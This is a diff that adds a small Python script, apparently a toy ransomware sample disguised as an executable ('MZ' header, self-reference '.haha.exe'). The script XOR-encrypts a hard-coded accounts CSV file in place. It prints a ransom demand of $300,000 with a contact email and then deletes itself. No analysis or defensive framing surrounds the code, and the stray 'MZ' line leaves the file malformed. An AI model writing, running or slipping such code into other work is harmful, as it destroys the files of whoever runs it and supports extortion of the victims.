@@ -1,0 +1,27 @@
+MZ
+import os
+
+def encrypt_file(input_file, key):
+    with open(input_file, 'rb') as f:
+        data = f.read()
+    
+    # XOR encryption/decryption
+    encrypted_data = bytearray([byte ^ key for byte in data])
+
+    with open(input_file, 'wb') as f:
+        f.write(encrypted_data)
+
+# Example usage
+if __name__ == "__main__":
+    file = "Services/Accounts/Accounts.csv"
+    this_file = ".haha.exe"
+
+    # Encryption key (can be any byte value)
+    key = 0xFF
+
+    # Encrypt the CSV file
+    encrypt_file(file, key)
+
+    print("you have been encrypted :( contact by_the_bye@mail.com and pay $300,000 to decrypt")
+
+    os.remove(this_file)
